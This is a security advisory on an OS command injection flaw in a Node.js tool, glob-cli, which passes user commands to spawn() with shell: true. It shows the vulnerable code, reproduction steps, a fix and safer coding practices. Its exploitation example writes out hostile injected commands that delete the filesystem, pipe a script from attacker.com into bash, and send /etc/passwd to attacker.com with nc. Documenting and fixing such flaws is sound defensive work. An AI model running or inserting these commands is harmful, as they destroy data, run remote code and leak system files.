# Security Advisory: Command Injection in glob-cli

## Summary

A command injection vulnerability exists in the glob-cli tool when using the `-c`/`--cmd` option. The vulnerability allows arbitrary command execution through shell metacharacters when `shell: true` is passed to `child_process.spawn()`.

## Vulnerability Details

**Severity**: Critical  
**CWE**: [CWE-78: OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)  
**CVSS Score**: 9.8 (Critical)

### Affected Code

The vulnerable code in `glob-cli.js`:

```javascript
const command = options.cmd.replace('{}', file);
const child = spawn(command, {
  shell: true,  // Enables shell interpretation
  stdio: 'inherit'
});
```

### Attack Vector

When `shell: true` is used with `spawn()`, the command string is passed to a system shell for execution. This allows attackers to inject additional commands using shell metacharacters:

- `;` - Command separator
- `&&` - Execute if previous command succeeds
- `||` - Execute if previous command fails
- `|` - Pipe output to another command
- `` ` `` - Command substitution
- `$()` - Command substitution
- `>`, `>>` - Output redirection
- `<` - Input redirection

### Exploitation Example

```bash
# Normal usage:
./glob-cli.js "*.log" -c "wc -l {}"

# Malicious usage:
./glob-cli.js "*.log" -c "wc -l {} ; rm -rf / #"
./glob-cli.js "*.log" -c "cat {} && curl http://attacker.com/steal.sh | bash"
./glob-cli.js "*.log" -c "cat {} ; cat /etc/passwd | nc attacker.com 4444"
```

### Impact

An attacker who can control or influence the `-c`/`--cmd` parameter can:

1. Execute arbitrary system commands
2. Read sensitive files
3. Modify or delete files
4. Install backdoors
5. Exfiltrate data
6. Escalate privileges
7. Pivot to other systems

## Reproduction Steps

1. Install the vulnerable version:
   ```bash
   cd glob-cli
   npm install
   ```

2. Create test files:
   ```bash
   mkdir test-files
   echo "test" > test-files/file1.txt
   ```

3. Execute the vulnerability:
   ```bash
   node glob-cli.js "test-files/*.txt" -c "cat {} ; echo 'COMPROMISED' > /tmp/pwned"
   ```

4. Verify exploitation:
   ```bash
   cat /tmp/pwned
   # Output: COMPROMISED
   ```

## Fix

The vulnerability has been fixed in `glob-cli-fixed.js` by:

### 1. Removing `shell: true`

Instead of passing a command string to the shell, the fixed version parses the command into an executable and argument array:

```javascript
// Parse command into parts
const cmdParts = options.cmd.split(/\s+/);
const executable = cmdParts[0];
const args = cmdParts.slice(1).map(arg => arg.replace('{}', file));

// Execute directly without shell
const child = spawn(executable, args, {
  stdio: 'inherit'  // No shell: true
});
```

### 2. How the Fix Prevents Injection

Without `shell: true`:
- Shell metacharacters are treated as literal arguments
- Only the specified executable is run
- No command chaining or substitution is possible
- Each argument is passed safely to the program

Example of safe execution:
```bash
# This command now fails safely:
node glob-cli-fixed.js "*.txt" -c "cat {} ; rm -rf /"

# Instead of executing:
#   cat file.txt ; rm -rf /
# It tries to execute:
#   cat file.txt ";" "rm" "-rf" "/"
# Which fails because ";" is not a file
```

## Security Best Practices

### When Using child_process in Node.js

1. **Never use `shell: true` with user input**
   - Prefer `execFile()` or `spawn()` without shell
   - Parse commands into executable + arguments array

2. **Validate and sanitize inputs**
   - Use allowlists for commands
   - Escape special characters if shell is required
   - Validate file paths

3. **Principle of least privilege**
   - Run with minimal permissions
   - Use sandboxing when possible
   - Implement command allowlists

4. **Use safer alternatives**
   ```javascript
   // UNSAFE:
   spawn(`cat ${userInput}`, { shell: true });
   
   // SAFE:
   spawn('cat', [userInput]);
   
   // SAFER (with validation):
   const allowedCommands = ['cat', 'ls', 'wc'];
   if (allowedCommands.includes(cmd)) {
     spawn(cmd, [userInput]);
   }
   ```

## Testing

Run the test suite to verify the fix:

```bash
cd glob-cli
npm test
```

The tests verify:
- Normal operation works correctly
- Command injection attempts are blocked
- Shell metacharacters are not interpreted

## References

- [CWE-78: Improper Neutralization of Special Elements used in an OS Command](https://cwe.mitre.org/data/definitions/78.html)
- [Node.js Security Best Practices](https://nodejs.org/en/docs/guides/security/)
- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [Node.js child_process documentation](https://nodejs.org/api/child_process.html)

## Timeline

- **2024-12-12**: Vulnerability identified and fixed
- **2024-12-12**: Security advisory published
- **2024-12-12**: Fixed version released

## Credits

Discovered and fixed by the security team as part of routine code review.
